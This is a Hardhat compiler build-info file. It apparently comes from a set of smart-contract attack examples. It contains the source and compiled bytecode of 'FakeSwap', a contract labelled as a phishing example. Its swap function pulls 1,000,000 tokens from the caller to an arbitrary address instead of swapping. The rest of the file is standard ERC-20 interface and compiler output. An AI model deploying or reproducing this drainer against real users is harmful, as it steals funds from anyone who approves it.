{
	"id": "0be0d59c6aa32a5698080ba992563959",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"M/Malicious Frontend Swap (User Phishing).sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/// @title Malicious Frontend Swap (Phishing Example)\n/// @notice Pretends to be a legitimate swap but steals tokens\ncontract FakeSwap {\n    function swap(address token, address to) external {\n        // Looks like a normal swap call, but it's a phishing attack.\n        IERC20(token).transferFrom(msg.sender, to, 1_000_000 ether);\n    }\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC-20 standard as defined in the ERC.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the value of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the value of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC-20 standard as defined in the ERC.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the value of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the value of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"M/Malicious Frontend Swap (User Phishing).sol": {
				"FakeSwap": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "swap",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"title": "Malicious Frontend Swap (Phishing Example)",
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"M/Malicious Frontend Swap (User Phishing).sol\":233:455  contract FakeSwap {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":233:455  contract FakeSwap {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6b76484e\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":257:453  function swap(address token, address to) external {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":394:399  token */\n      dup2\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":387:413  IERC20(token).transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":414:424  msg.sender */\n      caller\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":426:428  to */\n      dup4\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":430:445  1_000_000 ether */\n      0xd3c21bcecceda1000000\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":387:446  IERC20(token).transferFrom(msg.sender, to, 1_000_000 ether) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      pop\n        /* \"M/Malicious Frontend Swap (User Phishing).sol\":257:453  function swap(address token, address to) external {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_16:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_18:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_19:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_37\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_18\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_20:\n        /* \"#utility.yul\":641:665   */\n      tag_39\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_19\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_40\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      0x00\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_40:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_21:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_42\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_20\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:1315   */\n    tag_6:\n        /* \"#utility.yul\":909:915   */\n      0x00\n        /* \"#utility.yul\":917:923   */\n      0x00\n        /* \"#utility.yul\":966:968   */\n      0x40\n        /* \"#utility.yul\":954:963   */\n      dup4\n        /* \"#utility.yul\":945:952   */\n      dup6\n        /* \"#utility.yul\":941:964   */\n      sub\n        /* \"#utility.yul\":937:969   */\n      slt\n        /* \"#utility.yul\":934:1053   */\n      iszero\n      tag_44\n      jumpi\n        /* \"#utility.yul\":972:1051   */\n      tag_45\n      tag_16\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":934:1053   */\n    tag_44:\n        /* \"#utility.yul\":1092:1093   */\n      0x00\n        /* \"#utility.yul\":1117:1170   */\n      tag_46\n        /* \"#utility.yul\":1162:1169   */\n      dup6\n        /* \"#utility.yul\":1153:1159   */\n      dup3\n        /* \"#utility.yul\":1142:1151   */\n      dup7\n        /* \"#utility.yul\":1138:1160   */\n      add\n        /* \"#utility.yul\":1117:1170   */\n      tag_21\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1107:1170   */\n      swap3\n      pop\n        /* \"#utility.yul\":1063:1180   */\n      pop\n        /* \"#utility.yul\":1219:1221   */\n      0x20\n        /* \"#utility.yul\":1245:1298   */\n      tag_47\n        /* \"#utility.yul\":1290:1297   */\n      dup6\n        /* \"#utility.yul\":1281:1287   */\n      dup3\n        /* \"#utility.yul\":1270:1279   */\n      dup7\n        /* \"#utility.yul\":1266:1288   */\n      add\n        /* \"#utility.yul\":1245:1298   */\n      tag_21\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":1235:1298   */\n      swap2\n      pop\n        /* \"#utility.yul\":1190:1308   */\n      pop\n        /* \"#utility.yul\":841:1315   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1321:1439   */\n    tag_22:\n        /* \"#utility.yul\":1408:1432   */\n      tag_49\n        /* \"#utility.yul\":1426:1431   */\n      dup2\n        /* \"#utility.yul\":1408:1432   */\n      tag_19\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1403:1406   */\n      dup3\n        /* \"#utility.yul\":1396:1433   */\n      mstore\n        /* \"#utility.yul\":1321:1439   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1445:1554   */\n    tag_23:\n        /* \"#utility.yul\":1514:1521   */\n      0x00\n        /* \"#utility.yul\":1543:1548   */\n      dup2\n        /* \"#utility.yul\":1532:1548   */\n      swap1\n      pop\n        /* \"#utility.yul\":1445:1554   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1560:1637   */\n    tag_24:\n        /* \"#utility.yul\":1597:1604   */\n      0x00\n        /* \"#utility.yul\":1626:1631   */\n      dup2\n        /* \"#utility.yul\":1615:1631   */\n      swap1\n      pop\n        /* \"#utility.yul\":1560:1637   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1643:1703   */\n    tag_25:\n        /* \"#utility.yul\":1671:1674   */\n      0x00\n        /* \"#utility.yul\":1692:1697   */\n      dup2\n        /* \"#utility.yul\":1685:1697   */\n      swap1\n      pop\n        /* \"#utility.yul\":1643:1703   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1709:1915   */\n    tag_26:\n        /* \"#utility.yul\":1791:1800   */\n      0x00\n        /* \"#utility.yul\":1824:1909   */\n      tag_54\n        /* \"#utility.yul\":1842:1908   */\n      tag_55\n        /* \"#utility.yul\":1851:1907   */\n      tag_56\n        /* \"#utility.yul\":1901:1906   */\n      dup5\n        /* \"#utility.yul\":1851:1907   */\n      tag_23\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1842:1908   */\n      tag_25\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1824:1909   */\n      tag_24\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1811:1909   */\n      swap1\n      pop\n        /* \"#utility.yul\":1709:1915   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1921:2116   */\n    tag_27:\n        /* \"#utility.yul\":2040:2109   */\n      tag_58\n        /* \"#utility.yul\":2103:2108   */\n      dup2\n        /* \"#utility.yul\":2040:2109   */\n      tag_26\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2035:2038   */\n      dup3\n        /* \"#utility.yul\":2028:2110   */\n      mstore\n        /* \"#utility.yul\":1921:2116   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2122:2628   */\n    tag_10:\n        /* \"#utility.yul\":2303:2307   */\n      0x00\n        /* \"#utility.yul\":2341:2343   */\n      0x60\n        /* \"#utility.yul\":2330:2339   */\n      dup3\n        /* \"#utility.yul\":2326:2344   */\n      add\n        /* \"#utility.yul\":2318:2344   */\n      swap1\n      pop\n        /* \"#utility.yul\":2354:2425   */\n      tag_60\n        /* \"#utility.yul\":2422:2423   */\n      0x00\n        /* \"#utility.yul\":2411:2420   */\n      dup4\n        /* \"#utility.yul\":2407:2424   */\n      add\n        /* \"#utility.yul\":2398:2404   */\n      dup7\n        /* \"#utility.yul\":2354:2425   */\n      tag_22\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2435:2507   */\n      tag_61\n        /* \"#utility.yul\":2503:2505   */\n      0x20\n        /* \"#utility.yul\":2492:2501   */\n      dup4\n        /* \"#utility.yul\":2488:2506   */\n      add\n        /* \"#utility.yul\":2479:2485   */\n      dup6\n        /* \"#utility.yul\":2435:2507   */\n      tag_22\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2517:2621   */\n      tag_62\n        /* \"#utility.yul\":2617:2619   */\n      0x40\n        /* \"#utility.yul\":2606:2615   */\n      dup4\n        /* \"#utility.yul\":2602:2620   */\n      add\n        /* \"#utility.yul\":2593:2599   */\n      dup5\n        /* \"#utility.yul\":2517:2621   */\n      tag_27\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2122:2628   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2634:2724   */\n    tag_28:\n        /* \"#utility.yul\":2668:2675   */\n      0x00\n        /* \"#utility.yul\":2711:2716   */\n      dup2\n        /* \"#utility.yul\":2704:2717   */\n      iszero\n        /* \"#utility.yul\":2697:2718   */\n      iszero\n        /* \"#utility.yul\":2686:2718   */\n      swap1\n      pop\n        /* \"#utility.yul\":2634:2724   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2730:2846   */\n    tag_29:\n        /* \"#utility.yul\":2800:2821   */\n      tag_65\n        /* \"#utility.yul\":2815:2820   */\n      dup2\n        /* \"#utility.yul\":2800:2821   */\n      tag_28\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2793:2798   */\n      dup2\n        /* \"#utility.yul\":2790:2822   */\n      eq\n        /* \"#utility.yul\":2780:2840   */\n      tag_66\n      jumpi\n        /* \"#utility.yul\":2836:2837   */\n      0x00\n        /* \"#utility.yul\":2833:2834   */\n      0x00\n        /* \"#utility.yul\":2826:2838   */\n      revert\n        /* \"#utility.yul\":2780:2840   */\n    tag_66:\n        /* \"#utility.yul\":2730:2846   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2852:2989   */\n    tag_30:\n        /* \"#utility.yul\":2906:2911   */\n      0x00\n        /* \"#utility.yul\":2937:2943   */\n      dup2\n        /* \"#utility.yul\":2931:2944   */\n      mload\n        /* \"#utility.yul\":2922:2944   */\n      swap1\n      pop\n        /* \"#utility.yul\":2953:2983   */\n      tag_68\n        /* \"#utility.yul\":2977:2982   */\n      dup2\n        /* \"#utility.yul\":2953:2983   */\n      tag_29\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2852:2989   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2995:3340   */\n    tag_14:\n        /* \"#utility.yul\":3062:3068   */\n      0x00\n        /* \"#utility.yul\":3111:3113   */\n      0x20\n        /* \"#utility.yul\":3099:3108   */\n      dup3\n        /* \"#utility.yul\":3090:3097   */\n      dup5\n        /* \"#utility.yul\":3086:3109   */\n      sub\n        /* \"#utility.yul\":3082:3114   */\n      slt\n        /* \"#utility.yul\":3079:3198   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":3117:3196   */\n      tag_71\n      tag_16\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":3079:3198   */\n    tag_70:\n        /* \"#utility.yul\":3237:3238   */\n      0x00\n        /* \"#utility.yul\":3262:3323   */\n      tag_72\n        /* \"#utility.yul\":3315:3322   */\n      dup5\n        /* \"#utility.yul\":3306:3312   */\n      dup3\n        /* \"#utility.yul\":3295:3304   */\n      dup6\n        /* \"#utility.yul\":3291:3313   */\n      add\n        /* \"#utility.yul\":3262:3323   */\n      tag_30\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3252:3323   */\n      swap2\n      pop\n        /* \"#utility.yul\":3208:3333   */\n      pop\n        /* \"#utility.yul\":2995:3340   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122065e36d6835a8cee07f23408d2e31fba2ce6120f655b7322afb7cd02d04e924b564736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052348015600e575f5ffd5b506102968061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80636b76484e1461002d575b5f5ffd5b61004760048036038101906100429190610133565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff166323b872dd338369d3c21bcecceda10000006040518463ffffffff1660e01b8152600401610090939291906101cb565b6020604051808303815f875af11580156100ac573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d09190610235565b505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610102826100d9565b9050919050565b610112816100f8565b811461011c575f5ffd5b50565b5f8135905061012d81610109565b92915050565b5f5f60408385031215610149576101486100d5565b5b5f6101568582860161011f565b92505060206101678582860161011f565b9150509250929050565b61017a816100f8565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f6101b56101b06101ab84610180565b610192565b610189565b9050919050565b6101c58161019b565b82525050565b5f6060820190506101de5f830186610171565b6101eb6020830185610171565b6101f860408301846101bc565b949350505050565b5f8115159050919050565b61021481610200565b811461021e575f5ffd5b50565b5f8151905061022f8161020b565b92915050565b5f6020828403121561024a576102496100d5565b5